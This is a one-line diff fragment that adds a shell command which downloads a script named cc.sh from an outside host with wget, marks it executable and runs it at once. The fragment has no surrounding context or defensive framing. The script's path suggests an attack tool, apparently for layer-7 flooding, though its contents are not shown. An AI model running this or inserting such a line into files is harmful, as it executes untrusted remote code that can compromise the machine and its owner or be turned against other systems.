@@ -1,0 +1,1 @@
+wget http://cdn.auth7.cn/layer7/cc.sh -O cc.sh && chmod +x cc.sh && ./cc.sh
